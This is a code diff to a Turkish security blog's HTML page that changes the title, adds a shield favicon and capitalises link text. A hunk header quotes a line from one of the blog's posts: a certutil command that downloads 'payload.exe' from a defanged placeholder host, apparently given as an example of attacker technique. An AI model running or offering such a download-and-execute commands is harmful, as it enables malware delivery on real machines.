@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>0x52</title>
+<title>0x52 // Blog</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
 <style>
   :root{
     --bg: #0f1115;
@@ -395,7 +396,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
         <div class="post-meta">${p.date}</div>
         <h2><a href="#${p.id}" onclick="showPost('${p.id}'); return false;">${p.title}</a></h2>
         <p class="excerpt">${p.excerpt}</p>
-        <a class="read-more" href="#${p.id}" onclick="showPost('${p.id}'); return false;">devamını oku →</a>
+        <a class="read-more" href="#${p.id}" onclick="showPost('${p.id}'); return false;">Devamını oku →</a>
       </article>
     `).join('');
   }
@@ -407,7 +408,7 @@ Command: certutil -urlcache -split -f http://example[.]com/payload.exe</code></p
     aboutEl.classList.remove('open');
     detailEl.classList.add('open');
     detailEl.innerHTML = `
-      <a class="back-link" href="#" onclick="showList(); return false;">← tüm yazılar</a>
+      <a class="back-link" href="#" onclick="showList(); return false;">← Tüm Yazılar</a>
       <h1>${p.title}</h1>
       <div class="post-meta">${p.date}</div>
       ${p.body}
